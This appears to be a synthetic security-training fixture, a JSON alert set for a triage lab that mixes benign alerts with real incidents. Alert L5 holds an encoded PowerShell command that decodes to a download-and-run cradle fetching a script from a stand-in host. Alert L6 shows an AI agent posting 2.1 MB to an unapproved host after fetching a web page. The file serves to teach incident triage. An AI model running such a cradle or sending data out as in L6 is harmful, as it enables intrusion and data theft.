@@ -1,0 +1,66 @@
+{
+  "note": "Synthetic. Lab 4 Part 4. All names, addresses and times are invented. Times are Pacific on a Monday morning.",
+  "assets": {
+    "10.0.1.14": "Finance laptop (user dana@merritt.test)",
+    "10.0.1.30": "Vulnerability scanner (scans 10.0.1.0/24 every Monday at 07:00)",
+    "10.0.1.40": "Backup server (copies to the HR file server nightly at 02:00)",
+    "10.0.1.77": "Support AI agent host (approved to call api.llm-vendor.test and *.corp.test only)",
+    "10.0.1.90": "HR file server"
+  },
+  "approved_vendors": [
+    "av-updates.endpointvendor.test",
+    "api.llm-vendor.test"
+  ],
+  "alerts": [
+    {
+      "id": "L1",
+      "time": "08:12",
+      "rule": "New mailbox rule forwards mail outside the company",
+      "user": "dana@merritt.test",
+      "evidence": "New-InboxRule forwards all mail to dana.f1nance@mailbox-free.test; created from IP 203.0.113.55"
+    },
+    {
+      "id": "L2",
+      "time": "08:09",
+      "rule": "Impossible travel",
+      "user": "dana@merritt.test",
+      "evidence": "Sign-in at 07:58 from 198.51.100.20 (geo-IP: Fresno, US); sign-in at 08:09 from 203.0.113.55 (geo-IP: Bucharest, RO); MFA prompt approved at 08:08 on the second sign-in"
+    },
+    {
+      "id": "L3",
+      "time": "07:03",
+      "rule": "Port scan",
+      "src": "10.0.1.30",
+      "evidence": "One source contacted 254 hosts on ports 22, 80, 443, 445 in 6 minutes"
+    },
+    {
+      "id": "L4",
+      "time": "02:00",
+      "rule": "Large internal transfer",
+      "src": "10.0.1.40",
+      "dst": "10.0.1.90",
+      "evidence": "41 GB over SMB between 02:00 and 03:10"
+    },
+    {
+      "id": "L5",
+      "time": "08:20",
+      "rule": "Encoded PowerShell command",
+      "host": "10.0.1.14",
+      "evidence": "Parent process OUTLOOK.EXE started powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYwBkAG4ALQBzAHkAbgBjAC4AdABlAHMAdAAvAGEALgBwAHMAMQAiACkA"
+    },
+    {
+      "id": "L6",
+      "time": "08:31",
+      "rule": "AI agent write-type tool call to a host outside the approved list",
+      "src": "10.0.1.77",
+      "evidence": "tool http_post to hooks.pastebox.test, 2.1 MB body; session s-212 had fetched a web page 20 seconds earlier"
+    },
+    {
+      "id": "L7",
+      "time": "08:15",
+      "rule": "TLS to a rarely seen domain",
+      "src": "10.0.1.14",
+      "evidence": "ClientHello SNI av-updates.endpointvendor.test, 3 MB received; first time this month"
+    }
+  ]
+}
